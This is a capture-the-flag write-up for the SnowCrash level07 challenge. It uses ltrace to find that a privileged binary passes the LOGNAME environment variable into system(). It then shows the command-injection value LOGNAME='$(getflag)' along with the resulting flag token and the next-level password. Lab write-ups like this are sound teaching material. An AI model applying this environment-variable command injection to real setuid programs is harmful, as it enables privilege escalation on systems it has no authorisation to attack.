## level07:

I found a binary file, and when I tried to run it, the output was:

```bash
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$
```

i need to show the trace the library calls made by a program i used `ltrace`  It's especially useful for understanding what external libraries and system calls a program is using during execution

```bash
evel07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                                  = 2007
geteuid()                                                                                                                  = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                        = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                        = 0
getenv("LOGNAME")                                                                                                          = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff37, 0xb7e5ee55, 0xb7fed280)                                                        = 18
system("/bin/echo level07 "level07
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                     = 0
+++ exited (status 0) +++
level07@SnowCrash:~$
```

`getenv` retrieves a specific element from the environment variables.

```bash
level07@SnowCrash:~$ export | grep "LOGNAME"
declare -x LOGNAME="level07"
level07@SnowCrash:~$
```

Now, let’s inject a command to get the flag. When we run the binary file, the output will be the password.

```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```

the password of the next level is :fiumuikeil55xe9cu4dood66h

```bash
level07@SnowCrash:~$ su level08
Password:fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$
```